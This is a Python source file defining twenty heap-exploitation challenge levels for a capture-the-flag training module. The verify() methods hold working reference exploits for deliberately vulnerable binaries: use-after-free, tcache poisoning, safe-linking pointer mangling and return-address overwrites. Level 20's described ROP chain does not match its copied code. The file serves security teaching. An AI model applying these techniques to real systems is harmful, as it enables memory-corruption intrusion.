import pwnshop
import ctypes
import pwn

PWNSHOP_AUTOREGISTER = False

from pwnshop import Challenge
from pwnshop import retry


def malloc_usable_size(size):
    if size <= 8:
        size = 9
    return size + ((8 - size) % 16)


class BabyHeapBase(Challenge):
    TEMPLATE_PATH = "babyheap/babyheap.c"

    num_allocations = 1
    runtime_flag_buffer_size = False
    num_flag_buffer_allocs = 1
    secret_size = 0
    whitespace_armor = False
    stack_buffer = False
    align_0x16 = False
    randomize_stack_padding = False

    functions = ["malloc", "free", "puts", "read_flag", "quit"]

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

        if self.randomize_stack_padding:
            self.stack_padding = self.random.randrange(0x00, 0x100, step=0x08)

        if not self.runtime_flag_buffer_size:
            self.flag_buffer_size = self.random.randrange(128, 1000)

        self.functions_description = "/".join(self.functions)

        if self.secret_size:
            self.secret_padding = 0
            if not self.stack_buffer:
                self.secret_padding += self.random.randrange(0x21, 0xD0) * 256
            if self.whitespace_armor:
                self.secret_padding += ord("\n")
            elif self.align_0x16:
                self.secret_padding += self.random.randrange(0x00, 0xf0, 0x10)
            else:
                self.secret_padding += self.random.randrange(0x21, 0x80)

        if "send_flag" in self.functions:
            self.win_function = True

        if "stack_malloc_win" in self.functions:
            self.stack_malloc_win_size = self.random.randrange(0x21, 0x80)
            self.stack_malloc_win_size_usable = malloc_usable_size(self.stack_malloc_win_size)

    def mangle(self, addr, value):
     return (addr >> 12) ^ value

    # Note: only works for heap values on a happy list
    def demangle(self, obfus_ptr):
     o2 = (obfus_ptr >> 12) ^ obfus_ptr
     return (o2 >> 24) ^ o2

    # There has to be a better way of obtaining this, but the compiler seems to shift
    # the distance +/- 0x10  from the expected padding value
    def find_canary_offset(self, binary_path, safe_linking=False):
        assert set(["malloc", "free", "puts", "quit"]).issubset(self.functions)

        for i in range(0, 0x1000, 0x08):
            with pwn.process(binary_path, level='FATAL') as p:
                p.readuntil("[LEAK] The local stack address of your allocations is at: ")
                alloc_addr = int(p.readline()[:-2], 16)
                saved_rip = alloc_addr + i

                # Get heap leak
                for op in [
                        "malloc 0 64",
                        "malloc 1 64",
                        "free 0",
                        "free 1",
                        "puts 1"
                    ]:
                        p.sendline(op)

                p.recvuntil('Data: ')
                h = pwn.u64(p.recvline()[:-1].ljust(8, b'\x00'))
                if safe_linking:
                    heap_leak = self.demangle(h)
                else:
                    heap_leak = h

                if safe_linking:
                    alloc_addr = self.mangle(heap_leak, alloc_addr) # alignment

                for op in [
                    "scanf 1",
                    pwn.p64(alloc_addr),
                    "malloc 0 64",
                    "malloc 1 64",
                    "scanf 1",
                    pwn.p64(saved_rip), # Note: This is writing the addr to alloc slot 0 (on the stack)
                    "scanf 0",
                    pwn.p64(0xdeadbeefdeadbeef),
                    "quit"
                    ]:
                        p.sendline(op)
                if b'stack smashing' in p.recvall():
                    return i
        assert False

class BabyHeapLevel1(BabyHeapBase):
    ""
    def verify(self, **kwargs):
        """
        TBD
        """
        with self.run_challenge(**kwargs) as process:
            for operation in [
                f"malloc {self.flag_buffer_size}",
                "free",
                "read_flag",
                "puts",
                "quit",
            ]:
                process.sendline(operation)
            assert self.flag in process.readall()


class BabyHeapLevel2(BabyHeapBase):
    ""
    flag_seed = True

    runtime_flag_buffer_size = True
    print_malloc_pointers = True

    def verify(self, **kwargs):
        """
        TBD
        """
        with self.run_challenge(**kwargs) as process:
            for size in range(128, 1000):
                for operation in [f"malloc {size}", "free", "read_flag", "puts"]:
                    process.readuntil("[*] Function")
                    process.sendline(operation)
                process.readuntil("Data: ")
                if self.flag in process.readline():
                    break
            else:
                assert False


class BabyHeapLevel3(BabyHeapBase):
    ""
    num_allocations = 16
    num_flag_buffer_allocs = 2

    def verify(self, **kwargs):
        """
        TBD
        """
        with self.run_challenge(**kwargs) as process:
            for operation in [
                f"malloc 0 {self.flag_buffer_size}",
                f"malloc 1 {self.flag_buffer_size}",
                "free 0",
                "free 1",
                "read_flag",
                "puts 0",
                "quit",
            ]:
                process.sendline(operation)
            assert self.flag in process.readall()


class BabyHeapLevel4(BabyHeapBase):
    ""
    functions = ["malloc", "free", "puts", "scanf", "read_flag", "quit"]
    num_flag_buffer_allocs = 2

    def verify(self, **kwargs):
        """
        TBD
        """
        with self.run_challenge(**kwargs) as process:
            for operation in [
                f"malloc {self.flag_buffer_size}",
                "free",
                "scanf",
                "A" * 16,
                "free",
                "read_flag",
                "puts",
                "quit",
            ]:
                process.sendline(operation)
            assert self.flag in process.readall()


class BabyHeapLevel5(BabyHeapBase):
    ""
    functions = ["malloc", "free", "puts", "read_flag", "puts_flag", "quit"]
    num_allocations = 16

    def verify(self, **kwargs):
        """
        TBD
        """
        with self.run_challenge(**kwargs) as process:
            for operation in [
                f"malloc 0 {self.flag_buffer_size + 16}",
                f"malloc 1 {self.flag_buffer_size + 16}",
                "free 0",
                "free 1",
                "read_flag",
                "free 1",
                "puts_flag",
                "quit",
            ]:
                process.sendline(operation)
            assert self.flag in process.readall()


class BabyHeapLevel6(BabyHeapBase):
    ""
    PIE = False

    flag_seed = True

    functions = ["malloc", "free", "puts", "scanf", "send_flag", "quit"]
    num_allocations = 16
    secret_size = 8

    def verify(self, **kwargs):
        """
        TBD
        """
        with self.run_challenge(**kwargs) as process:
            for operation in [
                "malloc 0 64",
                "malloc 1 64",
                "free 0",
                "free 1",
                "scanf 1",
                pwn.p64(process.elf.symbols["secret"] + self.secret_padding),
                "malloc 2 64",
                "malloc 3 64",
            ]:
                process.sendline(operation)

            process.sendline("puts 3")

            process.readuntil("Data: ")
            secret = process.readline().strip()

            process.sendline("send_flag")
            process.sendline(secret)

            process.sendline("quit")

            assert self.flag in process.readall()


class BabyHeapLevel7(BabyHeapBase):
    ""
    PIE = False

    flag_seed = True

    functions = ["malloc", "free", "puts", "scanf", "send_flag", "quit"]
    num_allocations = 16
    secret_size = 16

    def verify(self, **kwargs):
        """
        TBD
        """
        with self.run_challenge(**kwargs) as process:
            for operation in [
                "malloc 0 64",
                "malloc 1 64",
                "free 0",
                "free 1",
                "scanf 1",
                pwn.p64(process.elf.symbols["secret"] + self.secret_padding + 8),
                "malloc 2 64",
                "malloc 3 64",
                "puts 3",
                "malloc 4 64",
                "malloc 5 64",
                "free 4",
                "free 5",
                "scanf 5",
                pwn.p64(process.elf.symbols["secret"] + self.secret_padding),
                "malloc 6 64",
                "malloc 7 64",
                "puts 7"
            ]:
                process.sendline(operation)

            process.readuntil("Data: ")
            secret = process.readline().strip()

            process.readuntil("Data: ")
            secret = process.readline().strip() + secret

        with self.run_challenge(**kwargs) as process:
            process.sendline("send_flag")
            process.sendline(secret)

            process.sendline("quit")

            assert self.flag in process.readall()


class BabyHeapLevel8(BabyHeapBase):
    ""
    PIE = False

    flag_seed = True

    functions = ["malloc", "free", "puts", "scanf", "send_flag", "quit"]
    num_allocations = 16
    secret_size = 16
    whitespace_armor = True

    def verify(self, **kwargs):
        """
        TBD
        """
        with self.run_challenge(**kwargs) as process:
            for operation in [
                "malloc 0 64",
                "malloc 1 64",
                "free 0",
                "free 1",
                "scanf 1",
                pwn.p64(
                    process.elf.symbols["secret"] + self.secret_padding - ord("\n")
                ),
                "malloc 2 64",
                "malloc 3 64",
            ]:
                process.sendline(operation)

            process.sendline("puts 3")

            process.readuntil("Data: ")
            secret = process.readline().strip()
            assert not secret

            for operation in ["scanf 3", "A" * 100, "send_flag", "A" * 100, "quit"]:
                process.sendline(operation)

            assert self.flag in process.readall()


class BabyHeapLevel9(BabyHeapBase):
    ""
    PIE = False

    flag_seed = True

    functions = ["malloc", "free", "puts", "scanf", "send_flag", "quit"]
    num_allocations = 16
    secret_size = 16
    discard_secret_malloc = True
    dont_scanf_0s = True

    def verify(self, **kwargs):
        """
        TBD
        """
        with self.run_challenge(**kwargs) as process:
            for operation in [
                "malloc 0 64",
                "malloc 1 64",
                "malloc 2 64",
                "free 0",
                "free 1",
                "scanf 1",
                pwn.p64(process.elf.symbols["secret"] + self.secret_padding),
                "malloc 3 64",
                "malloc 4 64",
            ]:
                process.sendline(operation)

            assert b"Invalid allocation detected: discarded!" in process.clean()

            process.sendline("free 2")
            process.sendline("puts 2")
            process.readuntil("Data: ")
            secret = process.read(8)

        with self.run_challenge(**kwargs) as process:
            for operation in [
                "malloc 0 64",
                "malloc 1 64",
                "malloc 2 64",
                "free 0",
                "free 1",
                "scanf 1",
                pwn.p64(process.elf.symbols["secret"] + self.secret_padding + 8),
                "malloc 3 64",
                "malloc 4 64",
            ]:
                process.sendline(operation)

            assert b"Invalid allocation detected: discarded!" in process.clean()

            process.sendline("free 2")
            process.sendline("puts 2")
            process.readuntil("Data: ")
            secret += process.read(8)

            for operation in ["send_flag", secret, "quit"]:
                process.sendline(operation)

            assert self.flag in process.readall()


class BabyHeapLevel10(BabyHeapBase):
    ""
    PIE = True

    functions = ["malloc", "free", "puts", "scanf", "quit"]
    num_allocations = 16

    randomize_stack_padding = True
    win_function = True
    win_function_aligned = True
    leak_stack_allocations = True
    leak_pie_main = True
    randomize_stack_padding = True

    BUILD_IMAGE = "ubuntu:20.04"

    @retry(16)
    def verify(self, **kwargs):
        """
        TBD
        """
        with self.run_challenge(**kwargs) as process:
            process.readuntil("[LEAK] The local stack address of your allocations is at: ")
            allocations_addr = int(process.readline()[:-2], 16)
            saved_rip = allocations_addr + self.find_canary_offset(process.executable, safe_linking=False) + 0x10

            process.readuntil("[LEAK] The address of main is at: ")
            main_addr = int(process.readline()[:-2], 16)
            win_addr = main_addr - process.elf.symbols["main"] + process.elf.symbols["win"]

            for operation in [
                "malloc 0 64",
                "malloc 1 64",
                "free 0",
                "free 1",
                "scanf 1",
                pwn.p64(saved_rip),
                "malloc 2 64",
                "malloc 3 64",
                "scanf 3",
                pwn.p64(win_addr),
                "quit",
            ]:
                process.sendline(operation)

            assert self.flag in process.readall()


class BabyHeapLevel11(BabyHeapBase):
    ""
    # TODO: randomize stack padding safely
    PIE = True

    functions = ["malloc", "free", "echo", "scanf", "quit"]
    num_allocations = 16

    win_function = True
    win_function_aligned = True
    stack_data_prefix = True

    @retry(16)  # TODO: this only catches AssertionError, but we can BrokenPipeError
    def verify(self, **kwargs):
        """
        TBD
        """
        with self.run_challenge(**kwargs) as process:
            for operation in [
                "malloc 0 32",
                "free 0",
                "echo 0 0",
                "echo 0 8",
            ]:
                process.sendline(operation)

            process.readuntil("Data: ")
            bin_echo_addr = process.readline()[:-1] + b'\x00\x00'
            assert len(bin_echo_addr) == 8
            bin_echo_addr = pwn.u64(bin_echo_addr)
            win_addr = bin_echo_addr - process.elf.symbols["bin_echo"] + process.elf.symbols["win"]

            process.readuntil("Data: ")
            stack_addr = process.readline()[:-1] + b'\x00\x00'
            assert len(stack_addr) == 8
            stack_addr = pwn.u64(stack_addr)

            saved_rip = stack_addr + 0x5e + 0x110 + 8  # TODO: compute this

            for operation in [
                "malloc 0 64",
                "malloc 1 64",
                "free 0",
                "free 1",
                "scanf 1",
                pwn.p64(saved_rip),
                "malloc 2 64",
                "malloc 3 64",
                "scanf 3",
                pwn.p64(win_addr),
                "quit",
            ]:
                process.sendline(operation)

            assert self.flag in process.readall()


class BabyHeapLevel12(BabyHeapBase):
    ""
    PIE = True

    functions = ["malloc", "free", "puts", "scanf", "stack_free", "stack_scanf", "stack_malloc_win", "quit"]
    num_allocations = 16

    win_function = True
    stack_buffer = True

    def verify(self, **kwargs):
        """
        TBD
        """
        with self.run_challenge(**kwargs) as process:
            for operation in [
                "stack_scanf",
                b"a" * (64 - 8) + pwn.p64(self.stack_malloc_win_size_usable + 8),
                "stack_free",
                "stack_malloc_win",
                "quit",
            ]:
                process.sendline(operation)

            assert self.flag in process.readall()


class BabyHeapLevel13(BabyHeapBase):
    ""
    PIE = True

    flag_seed = True

    functions = ["malloc", "free", "puts", "scanf", "stack_free", "stack_scanf", "send_flag", "quit"]
    num_allocations = 16

    win_function = True
    stack_buffer = True
    secret_size = 16

    def verify(self, **kwargs):
        """
        TBD
        """
        with self.run_challenge(**kwargs) as process:
            size = 64 + self.secret_padding + self.secret_size
            free_size = malloc_usable_size(size)

            for operation in [
                "stack_scanf",
                b"a" * (64 - 8) + pwn.p64(free_size + 8),
                "stack_free",
                f"malloc 0 {size}",
                "scanf 0",
                "A" * size,
                "send_flag",
                "A" * self.secret_size,
                "quit",
            ]:
                process.sendline(operation)

            assert self.flag in process.readall()


class BabyHeapLevel14(BabyHeapBase):
    ""
    PIE = True

    functions = ["malloc", "free", "echo", "scanf", "stack_free", "stack_scanf", "quit"]
    num_allocations = 16

    win_function = True
    stack_buffer = True
    stack_data_prefix = False

    @retry(1024)
    def verify(self, **kwargs):
        """
        TBD
        """
        with self.run_challenge(**kwargs) as process:
            size = 32
            free_size = malloc_usable_size(size)

            for operation in [
                "stack_scanf",
                b"a" * (64 - 8) + pwn.p64(free_size + 8),
                "stack_free",
                f"malloc 0 {size}",
                "free 0",
                "echo 0 0",
                "echo 0 16",
            ]:
                process.sendline(operation)

            process.readuntil("Data: ")
            bin_echo_addr = process.readline()[:-1] + b'\x00\x00'
            assert len(bin_echo_addr) == 8
            bin_echo_addr = pwn.u64(bin_echo_addr)
            win_addr = bin_echo_addr - process.elf.symbols["bin_echo"] + process.elf.symbols["win"]

            process.readuntil("Data: ")
            stack_addr = process.readline()[:-1] + b'\x00\x00'
            assert len(stack_addr) == 8
            stack_addr = pwn.u64(stack_addr)
            saved_rip = stack_addr + self.random.randrange(0, 0x400, 8)

            operations = b"\n".join([
                b"malloc 0 64",
                b"malloc 1 64",
                b"free 0",
                b"free 1",
                b"scanf 1",
                pwn.p64(saved_rip),
                b"malloc 2 64",
                b"malloc 3 64",
                b"scanf 3",
                pwn.p64(win_addr),
                b"quit",
            ])
            process.sendline(operations)

            assert self.flag in process.readall()


class BabyHeapLevel15(BabyHeapBase):
    ""
    # TODO: randomize stack padding safely
    PIE = True

    functions = ["malloc", "free", "echo", "read", "quit"]
    num_allocations = 16
    null_on_free = True

    win_function = True
    win_function_aligned = True
    stack_data_prefix = True

    @retry(16)  # TODO: this only catches AssertionError, but we can BrokenPipeError
    def verify(self, **kwargs):
        """
        TBD
        """
        with self.run_challenge(**kwargs) as process:
            for operation in [
                "malloc 0 32",
                "echo 0 48",
                "echo 0 56",
            ]:
                process.sendline(operation)

            process.readuntil("Data: ")
            bin_echo_addr = process.readline()[:-1] + b'\x00\x00'
            assert len(bin_echo_addr) == 8
            bin_echo_addr = pwn.u64(bin_echo_addr)
            win_addr = bin_echo_addr - process.elf.symbols["bin_echo"] + process.elf.symbols["win"]

            process.readuntil("Data: ")
            stack_addr = process.readline()[:-1] + b'\x00\x00'
            assert len(stack_addr) == 8
            stack_addr = pwn.u64(stack_addr)
            saved_rip = stack_addr + 0x5e + 0x110 + 8  # TODO: compute this

            for operation in [
                "malloc 1 32",
                "malloc 2 32",
                "free 1",
                "free 2",
                "read 0 200",
                b"A" * 192 + pwn.p64(saved_rip),
                "malloc 3 32",
                "malloc 4 32",
                "read 4 8",
                pwn.p64(win_addr),
                "quit",
            ]:
                process.sendline(operation)

            assert self.flag in process.readall()


class BabyHeapLevel16(BabyHeapBase):
    """
    """

    #This is Level 9, but with safe-linking
    PIE = False

    flag_seed = True

    functions = ["malloc", "free", "puts", "scanf", "send_flag", "quit"]
    num_allocations = 16
    secret_size = 16
    discard_secret_malloc = True
    dont_scanf_0s = True
    align_0x16 = True

    BUILD_IMAGE = "ubuntu:22.04"


    @retry(16)  # TODO: Something with ASLR makes this fail sometimes
    def verify(self, **kwargs):
        def send_cmd(cmd):
            p.sendline(cmd)
            p.recvuntil('quit')

        with self.run_challenge(**kwargs) as p:
            e = p.elf

            for op in [
                'malloc 0 48',
                'malloc 1 48',
                'malloc 2 48',
                'free 0',
                'free 1',
                'puts 1']:
                p.sendline(op)

            p.recvuntil('Data: ')
            mangled_heap_leak = pwn.u64(p.recvline()[:-1].ljust(8, b'\x00'))
            heap_leak = self.demangle(mangled_heap_leak)

            p.sendline('scanf 1')
            # We have to mangle the pointer ourselves
            # so that when this address is deref'd the next ptr will be the vals we want
            addr_to_leak = e.symbols['secret'] + self.secret_padding
            mangled_goal = self.mangle(heap_leak, addr_to_leak)
            p.sendline(pwn.p64(mangled_goal))

            for op in [
                'malloc 0 48',
                'malloc 1 48',
                'free 2',
                'puts 2']:
                p.sendline(op)

            p.recvuntil('Data: ')
            leak = pwn.u64(p.recv(8))

            # The returned value will be mangled by mmap_base and by address of value
            secret = self.mangle(addr_to_leak, self.mangle(heap_leak, leak))

            p.sendline('send_flag')
            p.sendline(pwn.p64(secret))
            p.sendline('quit')
            assert self.flag in p.recvall()

class BabyHeapLevel17(BabyHeapBase):
    ""

    #This is Level 10, with safe-linking

    PIE = True

    functions = ["malloc", "free", "puts", "scanf", "quit"]
    num_allocations = 16

    win_function = True
    win_function_aligned = True
    leak_stack_allocations = True
    leak_pie_main = True
    randomize_stack_padding = True

    BUILD_IMAGE = "ubuntu:22.04"

    @retry(16) # ASLR shenanigans with magic bytes
    def verify(self, **kwargs):
        """
        TBD
        """

        with self.run_challenge(**kwargs) as p:
            rip_offset = self.find_canary_offset(p.executable, safe_linking=True) + 0x10
            e = p.elf

            p.recvuntil("[LEAK] The local stack address of your allocations is at: ")
            alloc_addr = int(p.readline()[:-2], 16)
            saved_rip = alloc_addr + rip_offset

            p.recvuntil("[LEAK] The address of main is at: ")
            main_addr = int(p.readline()[:-2], 16)
            win_addr = main_addr - e.symbols["main"] + e.symbols["win"]

            # Get heap leak
            for op in [
                "malloc 0 64",
                "malloc 1 64",
                "free 0",
                "free 1",
                "puts 1"
            ]:
                p.sendline(op)

            p.recvuntil('Data: ')
            h = pwn.u64(p.recvline()[:-1].ljust(8, b'\x00'))
            heap_leak = self.demangle(h)

            # Overwrite the pointers stored on stack to gain arb/read/write
            mangled_alloc_addr = self.mangle(heap_leak, alloc_addr) # alignment
            for op in [
                "scanf 1",
                pwn.p64(mangled_alloc_addr),
                "malloc 0 64",
                "malloc 1 64",
                "scanf 1",
                pwn.p64(saved_rip),
                "scanf 0",
                pwn.p64(win_addr),
                "quit"
                ]:
                    p.sendline(op)
            assert self.flag in p.recvall()

class BabyHeapLevel18(BabyHeapBase):
    """

    """
    # This is 13, but with safe-linking
    # Doesn't actually change anything

    PIE = True

    flag_seed = True

    functions = ["malloc", "free", "puts", "scanf", "stack_free", "stack_scanf", "send_flag", "quit"]
    num_allocations = 16

    win_function = True
    stack_buffer = True
    secret_size = 16

    BUILD_IMAGE = "ubuntu:22.04"

    def verify(self, **kwargs):
        """
        TBD
        """
        with self.run_challenge(**kwargs) as process:
            size = 64 + self.secret_padding + self.secret_size
            free_size = malloc_usable_size(size)

            for operation in [
                "stack_scanf",
                b"a" * (64 - 8) + pwn.p64(free_size + 8),
                "stack_free",
                f"malloc 0 {size}",
                "scanf 0",
                "A" * size,
                "send_flag",
                "A" * self.secret_size,
                "quit",
            ]:
                process.sendline(operation)

            assert self.flag in process.readall()

class BabyHeapLevel19(BabyHeapBase):
    ""
    # TODO: randomize stack padding safely
    PIE = True

    functions = ["malloc", "free", "read_flag", "safe_write", "safe_read", "quit"]
    num_allocations = 16
    null_on_free = True

    win_function = True
    win_function_aligned = True
    stack_data_prefix = True

    BUILD_IMAGE = "ubuntu:22.04"

    def verify(self, **kwargs):
        """
        Overwrite the size to create an overlapping allocation
        with the flag.
        """
        with self.run_challenge(**kwargs) as process:
            m_size = 16
            read_len = m_size + 16 - 0x08
            input("waiting")
            for operation in [
                f"malloc 3 {m_size}",
                f"malloc 4 {m_size}",
                f"safe_read 3",
                b"a" * (read_len) + pwn.p64(0xf0),
                "free 4",
                "read_flag",
                "malloc 1 230",
                "safe_write 1",
                "quit"
            ]:
                process.sendline(operation)

            assert self.flag in process.readall()

class BabyHeapLevel20(BabyHeapBase):
    ""
    # TODO: randomize stack padding safely
    PIE = True

    functions = ["malloc", "free", "safe_write", "safe_read", "quit"]
    num_allocations = 16
    null_on_free = True
    stack_data_prefix = True

    BUILD_IMAGE = "ubuntu:22.04"

    def verify(self, **kwargs):
        """
        This is a monster
        - create overlap allocs to get arb read
        - leak a heap address
        - leak a libc address (stderr)
        - leak a stack address from libc
        - create overlap allocs to get arb write because you've probably
            destroyed some bins along the way to get here
        - ROP in libc to pop a shell

        only 1 version of this chal will be live.  My script exploit is not
        ready for randomness

        TODO: Upload clean script of this exploit - Robert
        """
        with self.run_challenge(**kwargs) as process:
            m_size = 16
            read_len = m_size + 16 - 0x08
            input("waiting")
            for operation in [
                f"malloc 3 {m_size}",
                f"malloc 4 {m_size}",
                f"safe_read 3",
                b"a" * (read_len) + pwn.p64(0xf0),
                "free 4",
                "read_flag",
                "malloc 1 230",
                "safe_write 1",
                "quit"
            ]:
                process.sendline(operation)

            assert self.flag in process.readall()
LEVELS = [
    BabyHeapLevel1,
    BabyHeapLevel2,
    BabyHeapLevel3,
    BabyHeapLevel4,
    BabyHeapLevel5,
    BabyHeapLevel6,
    BabyHeapLevel7,
    BabyHeapLevel8,
    BabyHeapLevel9,
    BabyHeapLevel10,
    BabyHeapLevel11,
    BabyHeapLevel12,
    BabyHeapLevel13,
    BabyHeapLevel14,
    BabyHeapLevel15,
    BabyHeapLevel16,
    BabyHeapLevel17,
    BabyHeapLevel18,
    BabyHeapLevel19,
    BabyHeapLevel20,
]
NUM_TESTING=1
DOJO_MODULE="heap"
pwnshop.register_challenges(LEVELS)
